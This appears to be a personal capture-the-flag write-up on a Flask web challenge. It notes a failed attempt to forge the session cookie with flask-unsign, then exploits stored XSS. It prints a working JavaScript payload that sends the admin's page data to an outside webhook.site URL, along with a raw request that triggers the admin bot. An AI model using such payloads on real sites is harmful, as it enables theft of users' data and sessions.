https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask
- Regarding the provided source code we know, that the admin uses the flag as aboutme description. Keeping this in mind, we need to find a way to authenticate as admin to see the aboutme field
![[Pasted image 20231231010727.png]]
![[Pasted image 20231231010741.png]]

![[Screenshot from 2023-12-31 00-21-48.png]]![[Screenshot from 2023-12-31 00-22-10.png]]


## Using flask-unsign to break the session-cookie and create a new one for admin
![[Screenshot from 2023-12-31 00-47-47.png]]

![[Pasted image 20231231011226.png]]
-> secret key is 16 random bytes, so no bruteforce is possible at all. Even if this looks vulnerable at first glance, breaking the cookie generation takes a huge effort


# XSS (Cross Site Scripting) vulnerability
- Looking at the source code another time, we can see that the poem is rendered using the default render_template method. So our inserted poem behaves like a normal html page. Thus we can inject a html function with inline JavaScript
![[Pasted image 20231231113812.png]]


#### Testing XSS vulnerability

![[Pasted image 20231231113739.png]]

- Looking at the rendered page, we get the alert box and everything
![[Pasted image 20231231114204.png]]




# Inserting script into XSS vulnerability

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirect Example</title>
</head>
<body onload="redirectToWebsite()">

    <script>
        function redirectToWebsite() {
            var aboutMeValue = document.getElementById('aboutme').value;
            var redirectUrl = 'https://webhook.site/8a6b57f8-0cb5-42a6-b13d-c8af2e254e42';  
            var finalUrl = redirectUrl + '?flag=' + encodeURIComponent(aboutMeValue);
            
            window.location.href = finalUrl;
        }
    </script>

</body>
</html>

    </body>
</html>
```


# Sending POST request to visit to start worker thread
```
POST /visit/ HTTP/2
Host: 7301cb0f1403-webth-vulnerable.numa.host
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 104
Origin: https://7301cb0f1403-webth-vulnerable.numa.host
Alt-Used: 7301cb0f1403-webth-vulnerable.numa.host
Referer: https://7301cb0f1403-webth-vulnerable.numa.host/poem/
Cookie: session=.eJwtjkFqAzEMRa8SvA7FtizZnjP0BiUMtiwloUMC9syihNy9hnb19R-I_15m1a2MmwyzfL3MaZ9hxsEsY5iz-Xxer9JO98fpn-mxbT8f5vK-nOdnl3Ezy94Pme3ezGIc2lxs8aV5UF8qqZNsMWIKKXtNgMWCFu9CjNIwKaCfYRkqoDKICxmsUgYKuUbr0EUJgVOrXEtKCTxTcs1bFuYYgFAat0x53i7G6bweQ_qfzTi6SscJeXRd9-e3PCbmgDQ9AnmybJEiUilQI9GcDzWh88KuNPP-Bc_8U9U.ZZNpnw.WB3jGKNSDpbIpaB7IUMMa8yLJ7A
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

csrf_token=ImM0NTY1YTA0NjI2MGMwNTY3NTZhYTNiNzY2ZTE0NGI4NTEyZWMxYWQi.ZZNpag.yQSFMHTIP4N_Qr9KfivR4oa_zJw
```

```jmxnzo@jmxnzo-ThinkPad-T470-W10DG:~$ flask-unsign --decode -c .eJwtjkFqAzEMRa8SvA7FtizZnjP0BiUMtiwloUMC9syihNy9hnb19R-I_15m1a2MmwyzfL3MaZ9hxsEsY5iz-Xxer9JO98fpn-mxbT8f5vK-nOdnl3Ezy94Pme3ezGIc2lxs8aV5UF8qqZNsMWIKKXtNgMWCFu9CjNIwKaCfYRkqoDKICxmsUgYKuUbr0EUJgVOrXEtKCTxTcs1bFuYYgFAat0x53i7G6bweQ_qfzTi6SscJeXRd9-e3PCbmgDQ9AnmybJEiUilQI9GcDzWh88KuNPP-Bc_8U9U.ZZNpnw.WB3jGKNSDpbIpaB7IUMMa8yLJ7A
{'_flashes': [('success', 'Logged in successfully.')], '_fresh': True, '_id': '1509a0a2ad23f2ab6f1e9057584892f835a03fa21477ed58f352d580c3b35fc3e14930f693649b701517e44c8dbcba88832c681d20cecc74365edcd969743177', '_user_id': 'surfer5', 'csrf_token': 'c4565a046260c056756aa3b766e144b8512ec1ad'}
```
![[Screenshot from 2024-01-02 02-42-16.png]]
# Reconnecting to webhawk 
![[Screenshot from 2024-01-02 02-42-36.png]]
